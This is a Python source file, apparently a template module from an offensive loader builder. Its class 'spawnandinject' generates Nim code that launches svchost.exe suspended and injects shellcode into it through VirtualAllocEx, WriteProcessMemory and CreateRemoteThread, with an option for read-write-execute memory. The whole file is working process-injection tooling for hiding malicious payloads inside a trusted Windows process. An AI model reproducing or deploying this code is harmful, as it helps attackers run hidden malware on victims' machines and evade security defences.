from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ['import winim/lean']

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return []

    def template(self) -> str:
        return Template("""
    {transformers}

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION

    si.cb = sizeof(si).DWORD

    CreateProcessA(nil, "$target", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)

    let address = VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission)
    WriteProcessMemory(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
    let hThread = CreateRemoteThread(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
    WaitForSingleObject(hThread, 500)
    CloseHandle(hThread)
""").substitute(target=self.target, memoryPermission=self.memoryPermission)